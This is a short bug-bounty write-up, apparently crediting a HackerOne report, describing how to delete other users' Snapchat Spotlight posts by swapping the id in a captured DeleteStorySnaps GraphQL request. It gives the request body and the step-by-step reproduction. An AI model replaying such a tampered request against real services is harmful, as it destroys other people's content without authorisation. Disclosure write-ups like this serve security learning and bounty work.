# ***Delete anyone's content remotely worth $15,000***

*1. Go to [https://my.snapchat.com/myposts](https://my.snapchat.com/myposts) and log in there.* <br>
*2. You will see your posts.* <br>
*3. Select any of your posts and click delete option.* <br>
*4. In delete request there is parameter of id:*
```
{"operationName":"DeleteStorySnaps","variables":{"ids":["███████"],"storyType":"SPOTLIGHT_STORY"},
"query":"mutation DeleteStorySnaps($ids: [String!]!, $storyType: StoryType!)
{\n deleteStorySnaps(ids: $ids, storyType: $storyType)\n}\n"}
```
*5. You just have to change this id parameter.* <br>
*6. You can easily get the id parameter. Now forward the request after replacing id with someone's else video id.* 
<br>&nbsp;

----
## ***Credit***
Based on [prickn9](https://hackerone.com/reports/1819832)'s writeup.
<br>&nbsp;

----
## ***Support***
You can Follow [me](https://www.linkedin.com/in/bhavesh-pardhi-/) on LinkedIn or
<br><br>[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://www.buymeacoffee.com/bhaveshpardhi)
